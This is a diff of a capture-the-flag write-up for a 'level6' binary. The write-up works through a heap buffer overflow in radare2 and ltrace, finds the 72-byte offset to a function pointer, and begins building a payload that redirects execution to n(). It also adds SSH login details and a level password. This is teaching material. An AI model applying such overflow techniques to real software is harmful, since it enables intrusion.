@@ -12,14 +12,14 @@ scp -r -P 4243 level6@localhost:/home/user/level6/level6 .
 
 I am running `r2` inside docker.
 ```bash
-docker run -it -v "$bin_file_path":/mnt/binary radare/radare2 bash -c "r2 /mnt/binary"
+docker run -it -v "$bin_file_path":/mnt/binary radare/radare2 bash -c "sudo /snap/radare2/current/bin/r2 /mnt/binary"
 ```
 
 ## Binary Analysis
 
 On the `r2` prompt we need to run a couple of commands to analyze the `main` function.
 ```bash
-[0x08048de8]> aaa # Automatically analyze the binary
+[0x08048de8]> aaa # Analyze the binary
 ...
 [0x08048ec0]> v # Enter visual mode
 ```
@@ -204,14 +204,32 @@ Breakpoint 1, 0x080484ca in main ()
 # 0x08048468 is the address of the function m();
 ```
 
-If we put a *breakpoint* after the `strcpy` call, we can see that the `EAX` register has the copied string argument, and that 72 bytes after, we find the address of the function `m()` which is going to be executed (`EIP` register).
+At `0x080484ca`, `EAX` contains what was in `esp+0x18`.
+At `0x080484a1` this is the return value of `malloc` that we store in `esp+0x18`.
+That value is a pointer and `0x080484ce` is a dereference instruction.
+This is the same as using the pointer as a function. Here the `m()` function.
 
 We want to replace its value with the address of the `n()` function: `0x08048454`:
 
+A quick `ltrace` shows where we got memory from `malloc`.
+```bash
+__libc_start_main(0x804847c, 1, 0xbffff804, 0x80484e0, 0x8048550 <unfinished ...>
+malloc(64)                                      = 0x0804a008
+malloc(4)                                       = 0x0804a050
+strcpy(0x0804a008, NULL <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+```
+
+The buffer sits at `0x0804a008` and the pointer to function sits at `0x0804a050`.
+`0x0804a050 - 0x0804a008 = 72`, so the offset should be 72.
 
 ### Solution
 
-So as we did with the previous levels, we construct our payload in the same way.
+Connect with `ssh -p 4243 level6@localhost`
+Enter the password `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
+
+As we did with the previous levels, we construct our payload in the same way.
 
 ```bash
 0x08048454 -> \x54\x84\x04\x08
